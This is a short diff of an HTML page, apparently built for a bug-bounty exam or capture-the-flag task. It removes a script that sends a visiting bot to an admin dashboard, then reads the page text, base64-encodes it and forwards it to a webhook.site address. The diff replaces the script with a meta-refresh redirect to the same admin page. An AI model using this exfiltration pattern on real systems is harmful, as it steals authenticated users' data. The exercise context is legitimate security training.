@@ -2,21 +2,7 @@
 <html>
 <body>
     <script>
-        // 1. Force the bot to the dashboard first to 'prime' the session
-        // 2. Then, we use a 'meta refresh' to bounce the bot's data back to us
-        
-        const target = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
-        const webhook = "https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4";
-
-        // This is a "Double-Hop"
-        // If we are already on the dashboard, we grab everything and leave
-        if (window.location.href.includes("hashacademy.co")) {
-            const bodyText = document.body.innerText;
-            window.location.href = webhook + "/?flag_hunt=" + btoa(bodyText.slice(0, 1000));
-        } else {
-            // If we are on GitHub, we jump into the admin panel
-            window.location.href = target;
-        }
+       <meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/admin/dashboard">
     </script>
 </body>
 </html>
